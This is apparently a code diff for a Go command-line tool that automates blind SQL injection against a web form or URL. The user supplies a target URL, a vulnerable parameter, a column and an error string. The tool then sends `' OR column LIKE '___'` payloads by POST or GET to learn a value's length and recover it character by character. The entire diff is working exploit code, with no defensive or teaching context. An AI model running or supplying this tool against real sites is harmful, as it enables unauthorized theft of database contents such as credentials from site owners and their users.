@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"errors"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -44,44 +45,163 @@ func showHeader() {
 
 }
 
-func askFor(message string) string {
+func askFor(message string, validValues ...string) string {
+	if len(validValues) != 0 {
+		message = fmt.Sprintf("%s %v", message, validValues)
+	}
 	fmt.Printf("  %s-> %s:%s ", colorBlue, message, colorReset)
 	line, err := reader.ReadString('\n')
 	handleError("Cannot read user input", err)
-	return strings.TrimSuffix(line, "\n")
+	line = strings.TrimSuffix(line, "\n")
+	if len(validValues) == 0 {
+		return line
+	} else {
+		line = strings.ToUpper(line)
+		for _, value := range validValues {
+			if strings.ToUpper(value) == line {
+				return line
+			}
+		}
+		handleError("Invalid value", errors.New(fmt.Sprintf("Valid values: %v", validValues)))
+	}
+	return ""
+}
+
+func doGet(targetUrl string) string {
+	res, err := http.Get(targetUrl)
+	handleError("Cannot do get", err)
+
+	defer res.Body.Close()
+
+	bytes, err := ioutil.ReadAll(res.Body)
+	handleError("Cannot read body", err)
+
+	return string(bytes)
+}
+
+func postForm(targetUrl string, values url.Values) string {
+	res, err := http.PostForm(targetUrl, values)
+	handleError("Cannot post form", err)
+
+	defer res.Body.Close()
+
+	bytes, err := ioutil.ReadAll(res.Body)
+	handleError("Cannot read body", err)
+
+	return string(bytes)
+}
+
+func fetchSize(targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage string) int {
+	test := func(size int) bool {
+		if method == "POST" {
+			attempt := fmt.Sprintf("' OR %s LIKE '%s' %s; #", targetColumn, strings.Repeat("_", size), extraConditions)
+			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
+			handleError("Cannot create values", err)
+			return !strings.Contains(postForm(targetUrl, values), errorMessage)
+		} else {
+			getUrl := strings.TrimSuffix(targetUrl, "/")
+			var prefix, suffix string
+			if inputName == "" {
+				if valueType == "STRING" {
+					prefix = "'"
+				} else {
+					prefix = "0"
+				}
+			} else {
+				if valueType == "STRING" {
+					prefix = fmt.Sprintf("?%s='", inputName)
+				} else {
+					prefix = fmt.Sprintf("?%s=0", inputName)
+				}
+				if extraInputs != "" {
+					suffix = fmt.Sprintf("&%s", extraInputs)
+				}
+			}
+			attempt := prefix
+			attempt += url.QueryEscape(fmt.Sprintf(" OR %s LIKE '%s' %s", targetColumn, strings.Repeat("_", size), extraConditions))
+			attempt += suffix
+			getUrl = fmt.Sprintf("%s/%s", getUrl, attempt)
+			return !strings.Contains(doGet(getUrl), errorMessage)
+		}
+	}
+	size := 0
+	result := false
+	for !result {
+		size++
+		result = test(size)
+	}
+	return size
+}
+
+func fetchValue(size int, targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage string) {
+	check := func(index int, char string) bool {
+		pattern := strings.Repeat("_", index)
+		pattern += char
+		pattern += strings.Repeat("_", size-index-1)
+
+		attempt := fmt.Sprintf("' OR %s LIKE '%s' %s; #", targetColumn, pattern, extraConditions)
+		values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
+		res, err := http.PostForm(targetUrl, values)
+		if err != nil {
+			res, err = http.PostForm(targetUrl, values)
+		}
+		handleError("Cannot post form", err)
+
+		defer res.Body.Close()
+
+		bytes, err := ioutil.ReadAll(res.Body)
+
+		body := string(bytes)
+
+		return !strings.Contains(body, errorMessage)
+	}
+
+	fmt.Printf("   %s=> ", colorGreen)
+	for i := 0; i < size; i++ {
+		found := false
+		for _, char := range chars {
+			str := string(char)
+			if str == "_" {
+				str = "\\_"
+			} else if str == "%" {
+				str = "\\@"
+			}
+			if check(i, str) {
+				fmt.Print(string(char))
+				found = true
+				break
+			}
+		}
+		if !found {
+			fmt.Printf("%s?%s", colorRed, colorGreen)
+		}
+	}
 }
 
 func attack() {
+	var inputName, valueType, extraInputs string
+
 	targetUrl := askFor("URL")
-	method := strings.ToUpper(askFor("Method [POST/GET]"))
+	method := askFor("Method", "POST", "GET")
+	if method == "GET" {
+		valueType = askFor("Value type", "STRING", "INT")
+	}
 	targetColumn := askFor("Target column")
-	inputName := askFor("Vunerable input name")
-	extraInputs := askFor("Extra inputs (pass=1234&something=321)")
+	if method == "POST" {
+		inputName = askFor("Vunerable input name")
+	} else {
+		inputName = askFor("Vunerable input name (leave empty to PATH values)")
+	}
+	if method == "POST" || inputName != "" {
+		extraInputs = askFor("Extra inputs (pass=1234&something=321)")
+	}
+	extraConditions := askFor("Extra conditions (`AND username='john doe', leave empty to none)")
 	errorMessage := askFor("Error message")
 
-	if method == "POST" {
-		test := func(size int) bool {
-			attempt := fmt.Sprintf("' OR %s LIKE '%s'; #", targetColumn, strings.Repeat("_", size))
-			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
-			res, err := http.PostForm(targetUrl, values)
-			handleError("Cannot post form", err)
+	size := fetchSize(targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage)
 
-			defer res.Body.Close()
-
-			bytes, err := ioutil.ReadAll(res.Body)
-
-			body := string(bytes)
-
-			return !strings.Contains(body, errorMessage)
-		}
-		size := 0
-		result := false
-		for !result {
-			size++
-			result = test(size)
-		}
-		fmt.Print(colorBlue)
-		fmt.Println(`
+	fmt.Print(colorBlue)
+	fmt.Println(`
        _,    _   _    ,_
   .o888P     Y8o8Y     Y888o.
  d88888      88888      88888b
@@ -93,52 +213,17 @@ YJGS8P"Y888P"Y888P"Y888P"Y8888P
   '8o          V          o8'
     '                     '
 		`)
-		fmt.Printf("   %s=> Size: %d\n", colorGreen, size)
+	fmt.Printf("   %s=> Size: %d\n", colorGreen, size)
 
-		check := func(index int, char string) bool {
-			pattern := strings.Repeat("_", index)
-			pattern += char
-			pattern += strings.Repeat("_", size-index-1)
+	needValue := askFor("Fetch value?", "Y", "N")
 
-			attempt := fmt.Sprintf("' OR %s LIKE '%s'; #", targetColumn, pattern)
-			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
-			res, err := http.PostForm(targetUrl, values)
-			if err != nil {
-				res, err = http.PostForm(targetUrl, values)
-			}
-			handleError("Cannot post form", err)
-
-			defer res.Body.Close()
-
-			bytes, err := ioutil.ReadAll(res.Body)
-
-			body := string(bytes)
-
-			return !strings.Contains(body, errorMessage)
-		}
-
-		fmt.Printf("   %s=> ", colorGreen)
-		for i := 0; i < size; i++ {
-			found := false
-			for _, char := range chars {
-				str := string(char)
-				if str == "_" {
-					str = "\\_"
-				} else if str == "%" {
-					str = "\\@"
-				}
-				if check(i, str) {
-					fmt.Print(string(char))
-					found = true
-					break
-				}
-			}
-			if !found {
-				fmt.Printf("%s?%s", colorRed, colorGreen)
-			}
-		}
-		fmt.Println()
+	if needValue == "N" {
+		return
 	}
+
+	fetchValue(size, targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage)
+
+	fmt.Println()
 }
 
 func main() {
